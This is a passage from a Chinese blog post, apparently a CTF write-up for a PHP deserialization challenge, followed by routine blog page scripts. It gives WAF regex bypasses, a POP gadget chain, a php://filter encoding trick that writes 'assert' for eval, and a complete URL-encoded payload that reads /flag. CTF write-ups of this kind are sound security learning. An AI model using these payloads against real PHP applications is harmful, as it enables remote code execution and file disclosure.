+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$Chu0</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;waf1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则匹配所有字母 i表示包括大小写</p>
+<p>若同时传入post和get则只会检测post</p>
+<p>可以直接post传入</p>
+<p>chu0&#x3D;1&amp;cmd&#x3D;1&amp;name&#x3D;1&amp;show%5Bshow.show&#x3D;1绕过</p>
+<p>waf2</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params"><span class="variable">$Chu0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show/i&#x27;</span>, <span class="variable">$Chu0</span>))</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;waf2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目参数是show_show.show </p>
+<p>_php识别不了，写作[然后url编码绕过即可</p>
+<p>进入反序列化的最后一卡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_show.show&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样让他开头识别的是C绕过</p>
+<p>更简单的可以O:1 –&gt; O:+1</p>
+<p>让O:后面不立刻是数字也可以绕过</p>
+<p>反序列化部分(为了方便演示修改了代码)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL); </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;fastfast&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;h1-&gt;<span class="title function_ invoke__">nonono</span>(<span class="variable">$this</span>-&gt;h2);        <span class="comment">//到call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>)</span>&#123;                  <span class="comment">//call会自己多套一层数组，只要2层就够了</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctf/i&#x27;</span>, <span class="variable">$args</span>[<span class="number">0</span>][<span class="number">0</span>][<span class="number">2</span>]))&#123;  </span><br><span class="line">                       <span class="comment">//到toString</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;gogogo&lt;br&gt;&quot;</span>;       <span class="comment">//3层数组</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chu0_write</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0 = <span class="string">&#x27;xiuxiuxiu&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString 触发成功！&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0 === <span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go on&quot;</span>;      <span class="comment">//指向同一引用</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not match&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>需要注意</p>
+<p>call默认包含一个维度的数组，所以只需要构造二维就行了</p>
+<p><img src="/images/image-20260606172003770.png" alt="image-20260606172003770"></p>
+<p>要让$this-&gt;chu0 &#x3D;&#x3D;&#x3D; $this-&gt;chu1需要</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;chu1 = &amp;<span class="variable">$b</span>-&gt;chu0;</span><br></pre></td></tr></table></figure>
+
+<p>指向同一引用</p>
+<p>构造链</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ctf;</span><br><span class="line"><span class="variable">$a</span>-&gt;h1 = <span class="keyword">new</span> show;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Chu0_write</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;chu1 = &amp;<span class="variable">$b</span>-&gt;chu0;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;h2 = <span class="keyword">array</span>(<span class="variable">$c</span>);</span><br></pre></td></tr></table></figure>
+
+<p>链长这样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="number">8</span>:<span class="string">&quot;SplStack&quot;</span>:<span class="number">171</span>:&#123;i:<span class="number">6</span>;:O:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;h1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;show&quot;</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">2</span>:<span class="string">&quot;h2&quot;</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;i:<span class="number">1</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;i:<span class="number">2</span>;O:<span class="number">10</span>:<span class="string">&quot;Chu0_write&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;chu0&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiuxiuxiu&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;chu1&quot;</span>;R:<span class="number">10</span>;s:<span class="number">3</span>:<span class="string">&quot;cmd&quot;</span>;N;&#125;&#125;&#125;%<span class="number">7</span></span><br></pre></td></tr></table></figure>
+
+<p>最后部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;chu0===<span class="variable language_">$this</span>-&gt;chu1)&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="string">&#x27;ctfshowshowshowwww&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;chu0&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">waf_in_waf_php</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;.txt&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;绕一下吧孩子&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="variable">$tmp</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;ctfw.txt&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$tmp</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$tmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;waf!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;ctfw.txt&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>为了清除掉ctfshowshowshowwww这个前缀来构造可利用的函数名</p>
+<p>需要使用多重编码的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=ctfw</span></span><br></pre></td></tr></table></figure>
+
+<p>UTF-8转换为utf-16le的时候会在每个字符后面增加一个\0，并且再转换为utf-8的时候只有带了\0的会被正确转义，根据这个原理可以直接把原文当作utf-16le然后执行转utf8,这样原文就会变成乱码，然后用base64剔除就行了，只需要让我们输入的文字提前加入\0</p>
+<p>由于file_get_contents会对空字节报错，所以我们还是需要对空字节进行填充处理，引用到quoted-printable编码</p>
+<p>最终生成写入内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;utf-16le&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">quoted_printable_encode</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y=00X=00N=00z=00Z=00X=00J=000=00</span><br></pre></td></tr></table></figure>
+
+<p>最后一个卡</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/f|l|a|g|x|\*|\?|\[|\]| |\&#x27;|\&lt;|\&gt;|\%/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>利用ascii动态生成字符</p>
+<p>把&#x2F;flag变成(chr(47).chr(102).chr(108).chr(97).chr(103))</p>
+<p>由于waf会检查所有参数，所以还是要给show url编码下</p>
+<pre><code>waf1($_REQUEST);
+waf2($_SERVER[&#39;QUERY_STRING&#39;]);
+</code></pre>
+<p>最终playload</p>
+<p>get</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%38%3a%22%53%70%6c%53%74%61%63%6b%22%3a%31%37%31%3a%7b%69%3a%36%3b%3a%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%73%3a%39%3a%22%78%69%75%78%69%75%78%69%75%22%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%30%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d&amp;name=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8/convert.base64-decode/resource=ctfw&amp;chu0=Y=00X=00N=00z=00Z=00X=00J=000=00&amp;cmd=%73%68%6f%77_source(chr(47).chr(102).chr(108).chr(97).chr(103))</span><br></pre></td></tr></table></figure>
+
+<p>post</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chu0=1&amp;cmd=1&amp;name=1&amp;show%5Bshow.show=1</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tyboykali.github.io/2026/05/11/xue-xue/" data-id="cuidLDR7Wd_UyOGTsbQnikbaP" data-title="学学" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/07/25/za-qi-za-ba/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          杂七杂八
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/05/03/newibe-lazy-newbie/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">newibe懒菜鸟</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/07/25/za-qi-za-ba/">杂七杂八</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/11/xue-xue/">学学</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/03/newibe-lazy-newbie/">newibe懒菜鸟</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/02/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/05/">五月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 TYBOYKALI<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives/" class="mobile-nav-link">归档</a>
+  
+    <a href="/links/" class="mobile-nav-link">友链</a>
+  
+</nav>
+    <canvas id="live2dCanvas"></canvas>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+<script>
+(function() {
+    var canvas = document.getElementById('live2dCanvas');
+    var app, model, coreModel;
+    var W = 390, H = 380;
+
+    function clamp(v, lo, hi) { return Math.max(lo, Math.min(hi, v)); }
+    function lerp(a, b, t) { return a + (b - a) * t; }
+
+    var mouse = { x:0.5, y:0.5 };
+    var sm = { x:0.5, y:0.5 };
+
+    var blink = {
+        v: 1, timer: 0, next: 3, phase: 'open', elapsed: 0,
+        count: 0, target: 1
+    };
+
+    function schedBlink() {
+        blink.next = 2 + Math.random() * 5;
+        blink.timer = 0;
+        blink.target = Math.random() < 0.15 ? 2 : 1;
+        blink.count = 0;
+    }
+
+    function startBlink() {
+        blink.phase = 'closing';
+        blink.elapsed = 0;
+        blink.count++;
+    }
+
+    function updateBlink(dt) {
+        blink.timer += dt;
+        if (blink.phase === 'open' && blink.timer >= blink.next) {
+            startBlink();
+            return;
+        }
+        var ct = 0.06, ht = 0.05, ot = 0.12;
+        switch (blink.phase) {
+            case 'closing':
+                blink.elapsed += dt;
+                blink.v = 1 - blink.elapsed / ct;
+                if (blink.elapsed >= ct) { blink.v = 0; blink.phase = 'closed'; blink.elapsed = 0; }
+                break;
+            case 'closed':
+                blink.elapsed += dt;
+                if (blink.elapsed >= ht) { blink.phase = 'opening'; blink.elapsed = 0; }
+                break;
+            case 'opening':
+                blink.elapsed += dt;
+                blink.v = blink.elapsed / ot;
+                if (blink.elapsed >= ot) {
+                    blink.v = 1; blink.phase = 'open'; blink.elapsed = 0;
+                    if (blink.count < blink.target) { setTimeout(startBlink, 180); }
+                    else { schedBlink(); }
+                }
+                break;
+        }
+    }
+
+    function updateTracking(dt) {
+        sm.x = lerp(sm.x, mouse.x, dt * 8);
+        sm.y = lerp(sm.y, mouse.y, dt * 8);
+    }
+
+    function applyParams() {
+        if (!coreModel) return;
+        coreModel.setParameterValueById('ParamEyeLOpen', blink.v);
+        coreModel.setParameterValueById('ParamEyeROpen', blink.v);
+        var ex = clamp((sm.x - 0.5) * 2.2, -0.85, 0.85);
+        var ey = clamp((sm.y - 0.5) * 2.2, -0.70, 0.70);
+        coreModel.setParameterValueById('ParamEyeBallX', ex);
+        coreModel.setParameterValueById('ParamEyeBallY', ey);
+    }
+
+    function positionModel() {
+        if (!model) return;
+        model.scale.set(0.08);
+        model.x = W * 0.48;
+        model.y = H * 0.50;
+        model.anchor.set(0.5, 0.5);
+    }
+
+    async function loadModel(url) {
+        model = await PIXI.live2d.Live2DModel.from(url, { autoInteract: false });
+        coreModel = model.internalModel.coreModel;
+        app.stage.addChild(model);
+        positionModel();
+        console.log('Live2D ready!');
+    }
+
+    async function start() {
+        PIXI.live2d.Live2DModel.registerTicker(PIXI.Ticker);
+
+        var urls = ['/live2d/models/enterprise/aierdeliqi_5.model3.json'];
+        for (var i = 0; i < urls.length; i++) {
+            try { await loadModel(urls[i]); return; }
+            catch(e) { console.warn('Failed: ' + urls[i], e); }
+        }
+    }
+
+    app = new PIXI.Application({
+        view: canvas,
+        backgroundAlpha: 0,
+        antialias: true,
+        width: W, height: H,
+        resolution: 2,
+        autoDensity: true,
+    });
+
+    window.PIXI = PIXI;
+
+    window.addEventListener('mousemove', function(e) {
+        mouse.x = e.clientX / window.innerWidth;
+        mouse.y = e.clientY / window.innerHeight;
+    });
+
+    window.PIXI = PIXI;
+
+    schedBlink();
+    start();
+
+    app.ticker.add(function(delta) {
+        var dt = app.ticker.deltaMS / 1000;
+        updateBlink(dt);
+        updateTracking(dt);
+        applyParams();
+    });
+
+    window.PIXI = PIXI;
+})();
+</script>
+
+  </div>
+<!-- hexo injector body_end start -->
+<script>
+(function() {
+  var articleTitle = document.querySelector('.article-title');
+  var firstHeading = document.querySelector('.article-entry > h1:first-child');
+  if (!articleTitle || !firstHeading) return;
+
+  var normalize = function(value) {
+    return value.replace(/\s+/g, '').toLowerCase();
+  };
+
+  if (normalize(articleTitle.textContent) === normalize(firstHeading.textContent)) {
+    firstHeading.hidden = true;
+  }
+})();
+</script>
+
+<div id="music-player" role="region" aria-label="音乐播放器">
+  <div class="player-row">
+    <button class="player-btn" id="btn-prev" type="button" title="上一首" aria-label="上一首"><span class="fa fa-step-backward" aria-hidden="true"></span></button>
+    <button class="player-btn play-btn" id="btn-play" type="button" title="播放" aria-label="播放" aria-pressed="false"><span class="fa fa-play" aria-hidden="true"></span></button>
+    <button class="player-btn" id="btn-next" type="button" title="下一首" aria-label="下一首"><span class="fa fa-step-forward" aria-hidden="true"></span></button>
+  </div>
+  <div class="player-info" aria-live="polite">
+    <span class="player-title" id="player-title">NO TRACK</span>
+    <span class="player-time" id="player-time">00:00 / 00:00</span>
+  </div>
+  <div class="player-volume-wrap">
+    <span class="fa fa-volume-up" aria-hidden="true"></span>
+    <input type="range" class="player-volume" id="player-volume" min="0" max="100" value="2" aria-label="音量">
+  </div>
+  <button class="player-btn" id="btn-playlist" type="button" title="播放列表" aria-label="播放列表" aria-expanded="false"><span class="fa fa-list-ul" aria-hidden="true"></span></button>
+</div>
+<div id="player-playlist" role="listbox" aria-label="播放列表"></div>
+
+<script>
+(function() {
+  var songs = [
+    { name: 'gta4', file: '/music/gta4.mp3' },
+    { name: 'try', file: '/music/try.mp3' },
+    { name: '可爱', file: '/music/可爱.mp3' },
+    { name: '打上火花', file: '/music/打上火花.mp3' },
+    { name: '谢谢', file: '/music/谢谢.mp3' },
+    { name: 'L_Youd _ Zerky - TempIe', file: '/music/L_Youd _ Zerky - TempIe (混音_Remix).ogg' },
+    { name: 'Virtual Riot - Purple Dragons', file: '/music/Virtual Riot - Purple Dragons (Dragons VIP).ogg' },
+    { name: 'All We Know (Virtual Riot Remix)', file: '/music/Virtual Riot _ The Chainsmokers _ Phoebe Ryan - All We Know (Virtual Riot Remix).ogg' },
+    { name: '昼夜 - 千与千寻', file: '/music/昼夜 - 千与千寻 (钢琴版).ogg' },
+    { name: 'lucky (氛围版)', file: '/music/等一会就睡 - 【FREE】lucky (氛围版).ogg' },
+    { name: '鲜花', file: '/music/鲜花.mp4' }
+  ];
+
+  var audio = new Audio();
+  var current = 0;
+  var playing = false;
+  var elPlay = document.getElementById('btn-play');
+  var elTitle = document.getElementById('player-title');
+  var elTime = document.getElementById('player-time');
+  var elVolume = document.getElementById('player-volume');
+  var elPlaylist = document.getElementById('player-playlist');
+  var elBtnPlaylist = document.getElementById('btn-playlist');
+
+  audio.volume = 0.02;
+
+  function fmtTime(value) {
+    if (!value || isNaN(value)) return '00:00';
+    var minutes = Math.floor(value / 60);
+    var seconds = Math.floor(value % 60);
+    return minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+  }
+
+  function setPlayState(isPlaying) {
+    playing = isPlaying;
+    elPlay.innerHTML = '<span class="fa fa-' + (playing ? 'pause' : 'play') + '" aria-hidden="true"></span>';
+    elPlay.setAttribute('aria-label', playing ? '暂停' : '播放');
+    elPlay.setAttribute('title', playing ? '暂停' : '播放');
+    elPlay.setAttribute('aria-pressed', String(playing));
+  }
+
+  function load(index) {
+    current = index;
+    audio.src = songs[index].file;
+    elTitle.textContent = songs[index].name;
+    renderPlaylist();
+    if (playing) {
+      audio.play().catch(function() { setPlayState(false); });
+    }
+  }
+
+  function togglePlay() {
+    if (!audio.src) load(0);
+    if (audio.paused) {
+      audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
+    } else {
+      audio.pause();
+      setPlayState(false);
+    }
+  }
+
+  function next() { load((current + 1) % songs.length); }
+  function previous() { load((current - 1 + songs.length) % songs.length); }
+
+  function renderPlaylist() {
+    elPlaylist.innerHTML = songs.map(function(song, index) {
+      return '<div class="pl-item' + (index === current ? ' active' : '') + '" role="option" aria-selected="' + (index === current) + '" data-idx="' + index + '">' + song.name + '</div>';
+    }).join('');
+  }
+
+  elPlay.addEventListener('click', togglePlay);
+  document.getElementById('btn-prev').addEventListener('click', previous);
+  document.getElementById('btn-next').addEventListener('click', next);
+
+  elVolume.addEventListener('input', function() {
+    audio.volume = this.value / 100;
+  });
+
+  elBtnPlaylist.addEventListener('click', function(event) {
+    event.stopPropagation();
+    var expanded = !elPlaylist.classList.contains('show');
+    elPlaylist.classList.toggle('show', expanded);
+    elBtnPlaylist.setAttribute('aria-expanded', String(expanded));
+  });
+
+  elPlaylist.addEventListener('click', function(event) {
+    var item = event.target.closest('.pl-item');
+    if (!item) return;
+    load(parseInt(item.getAttribute('data-idx'), 10));
+    audio.play().then(function() { setPlayState(true); }).catch(function() { setPlayState(false); });
+  });
+
+  document.addEventListener('click', function(event) {
+    if (!elPlaylist.contains(event.target) && event.target !== elBtnPlaylist) {
+      elPlaylist.classList.remove('show');
+      elBtnPlaylist.setAttribute('aria-expanded', 'false');
+    }
+  });
+
+  audio.addEventListener('timeupdate', function() {
+    elTime.textContent = fmtTime(audio.currentTime) + ' / ' + fmtTime(audio.duration || 0);
+  });
+  audio.addEventListener('ended', function() { next(); });
+  audio.addEventListener('pause', function() { setPlayState(false); });
+  audio.addEventListener('play', function() { setPlayState(true); });
+  audio.addEventListener('error', function() { setPlayState(false); });
+
+  renderPlaylist();
+})();
+</script>
+
+<script>
+(function() {
+  // 只在文章页面显示目录
+  var article = document.querySelector('.article-type-page, .article-type-post');
+  if (!article) return;
+
+  // 检查是否在文章详情页（非首页列表）
+  if (document.querySelector('.article-more-link')) return;
+
+  // 获取文章内容区域
+  var content = article.querySelector('.article-entry');
+  if (!content) return;
+
+  // 获取所有标题
+  var headings = content.querySelectorAll('h2, h3, h4');
+  if (headings.length < 2) return;
+
+  // 创建目录容器
+  var toc = document.createElement('div');
+  toc.className = 'article-toc-sidebar';
